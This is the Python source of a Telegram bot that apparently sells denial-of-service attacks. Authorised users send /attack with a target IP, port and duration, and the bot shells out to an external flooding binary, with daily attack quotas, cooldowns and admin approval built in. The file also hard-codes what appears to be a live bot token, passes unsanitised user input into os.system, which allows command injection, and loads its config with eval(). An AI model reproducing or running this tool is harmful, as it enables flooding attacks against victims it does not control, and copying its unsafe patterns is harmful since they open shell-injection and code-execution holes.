import os
import threading
import asyncio
import time
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = "6838193855:AAGcpUWdeYWUjg75mSNZ5c7gS8E0nny63RM"
ADMIN_ID = "6512242172"
GROUP_ID = "-1002365524959"

USER_FILE = "users.txt"
LOG_FILE = "log.txt"
LIMIT_FILE = "attack_limits.json"
RESET_FILE = "reset.txt"

authorized_users = set()
active_attacks = []
user_cooldowns = {}
attack_limits = {}

MAX_CONCURRENT_ATTACKS = 3
ATTACK_COOLDOWN = 60
MAX_ATTACK_DURATION = 180
DEFAULT_DAILY_LIMIT = 10


def log_action(text):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {text}\n")


def load_users():
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            for line in f:
                user_id = line.strip().split(" - ")[0]
                authorized_users.add(user_id)


def save_user(user_id):
    now = datetime.now()
    formatted = now.strftime("%H:%M %d/%m/%Y")
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id} - Added on {formatted}\n")


def remove_user_from_file(user_id):
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            lines = f.readlines()
        with open(USER_FILE, "w") as f:
            for line in lines:
                if not line.startswith(user_id):
                    f.write(line)


def load_limits():
    global attack_limits
    if os.path.exists(LIMIT_FILE):
        with open(LIMIT_FILE, "r") as f:
            attack_limits = eval(f.read())


def save_limits():
    with open(LIMIT_FILE, "w") as f:
        f.write(str(attack_limits))


def check_daily_reset():
    today = datetime.now().strftime("%Y-%m-%d")
    if not os.path.exists(RESET_FILE):
        with open(RESET_FILE, "w") as f:
            f.write(today)

    with open(RESET_FILE, "r") as f:
        last_reset = f.read().strip()

    if last_reset != today:
        for user in attack_limits:
            attack_limits[user]["used"] = 0
        save_limits()
        with open(RESET_FILE, "w") as f:
            f.write(today)
        log_action("✅ Daily attack limits reset.")


def is_authorized(chat_id, user_id):
    return (
        str(user_id) == ADMIN_ID or
        str(chat_id) == GROUP_ID or
        str(chat_id).startswith("-100") or
        str(user_id) in authorized_users or
        str(chat_id) in authorized_users
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = str(update.effective_chat.id)
    user_id = str(update.effective_user.id)
    if not is_authorized(chat_id, user_id):
        return

    await update.message.reply_text(
        "🚀 *Bot is online and ready!*\n"
        "👑 Owner: @offx_sahil\n"
        "📣 Channel: [Join Here](https://t.me/kasukabe0)\n\n"
        "Use /help to see available commands.",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_chat.id, update.effective_user.id):
        return

    await update.message.reply_text(
        "🛠 *Bot Commands:*\n"
        "✅ /start\n"
        "✅ /help\n"
        "✅ /attack <ip> <port> <duration>\n"
        "✅ /approve <user_id> <limit>\n"
        "✅ /adduser <id>\n"
        "✅ /removeuser <id>\n"
        "✅ /status\n"
        "✅ /clearstatus <slot>\n"
        "✅ /allusers\n"
        "✅ /clearlogs\n"
        "✅ /mylogs",
        parse_mode="Markdown"
    )


async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return await update.message.reply_text("⚕️ Only admin can use this.")
    if len(context.args) != 2:
        return await update.message.reply_text("Usage: /approve <user_id> <limit>")
    uid = context.args[0]
    limit = int(context.args[1])
    attack_limits[uid] = {"limit": limit, "used": 0}
    save_limits()
    await update.message.reply_text(f"✅ `{uid}` approved with limit {limit}.", parse_mode="Markdown")


async def adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return await update.message.reply_text("⚕️ Only admin can add users.")
    if len(context.args) != 1:
        return await update.message.reply_text("Usage: /adduser <user_id>")
    uid = context.args[0]
    if uid in authorized_users:
        return await update.message.reply_text("⚠️ Already authorized.")
    authorized_users.add(uid)
    save_user(uid)
    log_action(f"Admin added: {uid}")
    await update.message.reply_text(f"✅ `{uid}` authorized.", parse_mode="Markdown")


async def removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return await update.message.reply_text("⚕️ Only admin.")
    if len(context.args) != 1:
        return await update.message.reply_text("Usage: /removeuser <user_id>")
    uid = context.args[0]
    authorized_users.discard(uid)
    attack_limits.pop(uid, None)
    remove_user_from_file(uid)
    save_limits()
    log_action(f"Admin removed: {uid}")
    await update.message.reply_text(f"✅ `{uid}` removed.", parse_mode="Markdown")


def execute_attack(ip, port, duration, attack_id, chat_id, context):
    active_attacks.append(attack_id)
    os.system(f"./iiipx {ip} {port} {duration}")
    asyncio.run(send_attack_finished_message(chat_id, ip, port, context))
    if attack_id in active_attacks:
        active_attacks.remove(attack_id)


async def send_attack_finished_message(chat_id, ip, port, context):
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ *Attack Finished!* 🎯 Target `{ip}:{port}`",
        parse_mode="Markdown"
    )


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    chat_id = str(update.effective_chat.id)

    if not is_authorized(chat_id, user_id):
        return await update.message.reply_text("⛔ Unauthorized!")

    if str(user_id) != ADMIN_ID:
        if user_id not in attack_limits:
            attack_limits[user_id] = {"limit": DEFAULT_DAILY_LIMIT, "used": 0}
        elif attack_limits[user_id]["used"] >= attack_limits[user_id]["limit"]:
            return await update.message.reply_text("❌ Daily limit reached.")

    if len(context.args) != 3:
        return await update.message.reply_text("Usage: /attack <ip> <port> <duration>")

    ip, port, duration = context.args
    if not duration.isdigit() or int(duration) > MAX_ATTACK_DURATION:
        return await update.message.reply_text("⚕️ Max time: 180 seconds.")

    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        return await update.message.reply_text("⚠️ Max attacks running!")

    now = time.time()
    if user_id in user_cooldowns and now - user_cooldowns[user_id] < ATTACK_COOLDOWN:
        wait = int(ATTACK_COOLDOWN - (now - user_cooldowns[user_id]))
        return await update.message.reply_text(f"⏳ Wait {wait}s before next attack.")

    user_cooldowns[user_id] = now
    attack_id = f"{chat_id}-{time.time()}"
    threading.Thread(target=execute_attack, args=(ip, port, duration, attack_id, chat_id, context)).start()

    log_action(f"UserID: {user_id} attack on {ip}:{port} for {duration}s")
    if user_id != ADMIN_ID:
        attack_limits[user_id]["used"] += 1
        save_limits()

    await update.message.reply_text(f"🔥 *Attack Started:* `{ip}:{port}` for {duration}s", parse_mode="Markdown")


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = len(active_attacks)
    await update.message.reply_text(f"📊 Active attacks: *{count}* / {MAX_CONCURRENT_ATTACKS}", parse_mode="Markdown")


async def clearstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return await update.message.reply_text("⚠️ Only admin.")
    if len(context.args) != 1 or not context.args[0].isdigit():
        return await update.message.reply_text("Usage: /clearstatus <slot>")
    slot = int(context.args[0])
    if slot < 1 or slot > len(active_attacks):
        return await update.message.reply_text("⚠️ Invalid slot.")
    removed = active_attacks.pop(slot - 1)
    log_action(f"Admin cleared attack: {removed}")
    await update.message.reply_text(f"✅ Cleared attack slot {slot}.")


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return await update.message.reply_text("⚠️ Admin only.")
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            content = f.read()
            response = content if content.strip() else "No users found."
    else:
        response = "No user file."
    await update.message.reply_text(response)


async def clearlogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_ID:
        return await update.message.reply_text("⚠️ Admin only.")
    open(LOG_FILE, "w").close()
    log_action("Admin cleared logs.")
    await update.message.reply_text("🧹 Logs cleared.")


async def mylogs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            lines = [line for line in f.readlines() if f"UserID: {uid}" in line]
            reply = ''.join(lines[-5:]) if lines else "No logs."
    else:
        reply = "No log file."
    await update.message.reply_text(reply)


def main():
    load_users()
    load_limits()
    check_daily_reset()
    authorized_users.add(ADMIN_ID)

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("clearstatus", clearstatus))
    app.add_handler(CommandHandler("mylogs", mylogs))
    app.add_handler(CommandHandler("adduser", adduser))
    app.add_handler(CommandHandler("removeuser", removeuser))
    app.add_handler(CommandHandler("clearlogs", clearlogs))
    app.add_handler(CommandHandler("allusers", allusers))
    app.add_handler(CommandHandler("approve", approve))

    print("🤖 Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
